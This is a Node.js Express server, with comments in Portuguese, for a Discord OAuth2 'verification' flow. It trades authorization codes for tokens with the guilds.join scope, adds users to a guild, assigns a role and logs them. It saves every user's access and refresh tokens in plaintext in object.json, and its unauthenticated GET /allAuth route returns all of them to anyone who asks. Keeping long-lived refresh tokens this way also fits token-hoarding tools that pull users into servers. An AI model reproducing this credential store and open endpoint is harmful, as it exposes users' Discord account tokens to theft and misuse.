const express = require('express');
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const config = require('./config');

const app = express();
app.use(bodyParser.text());

const OBJECT_FILE = path.join(__dirname, 'object.json');

function loadUsers() {
    try {
        return JSON.parse(fs.readFileSync(OBJECT_FILE, 'utf8'));
    } catch {
        return [];
    }
}

function saveUsers(data) {
    fs.writeFileSync(OBJECT_FILE, JSON.stringify(data));
}

// Inicializa o arquivo se não existir
if (!fs.existsSync(OBJECT_FILE)) saveUsers([]);

// ── Rotas ────────────────────────────────────────────────────────────────────

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.get('/healthz', (req, res) => res.json({ status: 'ok' }));

app.get('/allAuth', (req, res) => res.json(loadUsers()));

app.post('/', async (req, res) => {
    try {
        const code = req.body;
        if (!code) return res.sendStatus(400);

        // Troca code por token
        let form = new FormData();
        form.append('client_id', config.id);
        form.append('client_secret', config.secret);
        form.append('grant_type', 'authorization_code');
        form.append('redirect_uri', config.redirectUri);
        form.append('scope', 'identify guilds.join');
        form.append('code', code);

        const tokenRes = await fetch('https://discord.com/api/oauth2/token', { method: 'POST', body: form });
        const cdcd = await tokenRes.json();
        if (!cdcd.access_token) {
            console.log('[!] Token inválido:', cdcd);
            return res.sendStatus(400);
        }

        const ac_token = cdcd.access_token;
        const rf_token = cdcd.refresh_token;

        // Busca dados do usuário
        const userRes = await axios.get('https://discord.com/api/users/@me', {
            headers: { authorization: `${cdcd.token_type} ${ac_token}` }
        });
        const user = userRes.data;
        const userId = user.id;
        const avatarHASH = user.avatar
            ? `https://cdn.discordapp.com/avatars/${userId}/${user.avatar}.png?size=4096`
            : `https://cdn.discordapp.com/embed/avatars/0.png`;

        // Salva no object.json
        const parsed = loadUsers();
        const jaExiste = parsed.some(u => u.userID === userId);
        if (!jaExiste) {
            parsed.push({
                userID: userId,
                avatarURL: avatarHASH,
                username: `${user.username}#${user.discriminator}`,
                access_token: ac_token,
                refresh_token: rf_token
            });
            saveUsers(parsed);
            console.log('[+] ' + user.username + '#' + user.discriminator);
        } else {
            console.log('[-] já existe: ' + user.username);
        }

        const botHeaders = {
            Authorization: `Bot ${config.token}`,
            'Content-Type': 'application/json'
        };

        // Adiciona ao servidor
        if (config.guildId && config.token) {
            await axios.put(
                `https://discord.com/api/guilds/${config.guildId}/members/${userId}`,
                { access_token: ac_token },
                { headers: botHeaders }
            ).catch(e => console.log('[!] add member:', e.response?.data?.message || e.message));

            // Dá o cargo
            if (config.verifyRole) {
                await axios.put(
                    `https://discord.com/api/guilds/${config.guildId}/members/${userId}/roles/${config.verifyRole}`,
                    {},
                    { headers: botHeaders }
                ).catch(e => console.log('[!] add role:', e.response?.data?.message || e.message));
            }
        }

        // Log no canal
        if (config.logChannel && config.token) {
            await axios.post(
                `https://discord.com/api/channels/${config.logChannel}/messages`,
                {
                    embeds: [{
                        color: 0x57f287,
                        title: '✅ Novo membro verificado',
                        thumbnail: { url: avatarHASH },
                        description: `**Usuário:** ${user.username}#${user.discriminator}\n**ID:** \`${userId}\``,
                        timestamp: new Date().toISOString(),
                    }]
                },
                { headers: botHeaders }
            ).catch(e => console.log('[!] log channel:', e.response?.data?.message || e.message));
        }

        res.sendStatus(200);
    } catch (e) {
        console.log('[!] Erro no POST:', e.message);
        res.sendStatus(500);
    }
});

app.listen(config.port, () => console.log(`[SERVER] Rodando na porta ${config.port}`));
